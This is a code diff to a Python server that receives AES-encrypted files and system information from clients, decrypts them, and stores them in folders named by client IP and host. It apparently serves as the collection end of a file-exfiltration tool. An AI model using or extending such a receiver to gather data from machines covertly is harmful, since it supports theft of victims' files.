@@ -182,7 +182,7 @@ class IWE:
 
         return plain_text
 
-    def aes256_decrypt_filename(self, aes_b64_filename: str) -> str:
+    def aes256_decrypt_b64_string(self, aes_b64_filename: str) -> str:
         """
         Takes an AES256 encrypted base64 string and converts it back to the original file name
 
@@ -301,7 +301,8 @@ def main():
             raise e
 
         try:
-            file_full_path = iwe.aes256_decrypt_filename(content['fn'])
+            file_full_path = iwe.aes256_decrypt_b64_string(content['fn'])
+            system_info = iwe.aes256_decrypt_b64_string(content['si'])
             plaintext_bytes = iwe.aes256_decrypt_binary(content['ct'])
         except CouldNotDecryptError:
             return Response('Error: Received encrypted file but could not decrypt it. Wrong password?', status=200)
@@ -311,12 +312,11 @@ def main():
         dirs = os.path.dirname(file_full_path).replace(':', '')
         filename = os.path.basename(file_full_path)
 
-        useragent = ''.join(char for char in request.headers.get('User-Agent') if char not in ';:/\\*?><|')
-        useragent = useragent.replace(' ', '_')
+        system_ident = ''.join(char for char in system_info if char not in ';:/\\*?><|')
+        system_ident = system_ident.replace(' ', '_')
         client_ip = request.remote_addr
-        timestamp = datetime.now().strftime("%Y_%m%d_%H.%M.%S")
 
-        client_folder_name = f"{client_ip}_{useragent}_{timestamp}"
+        client_folder_name = f"{client_ip}_{system_ident}"
 
         os.makedirs(os.path.join(args.targetdir, client_folder_name, dirs), exist_ok=True)
         with open(os.path.join(args.targetdir, client_folder_name, dirs, filename), "wb") as f:
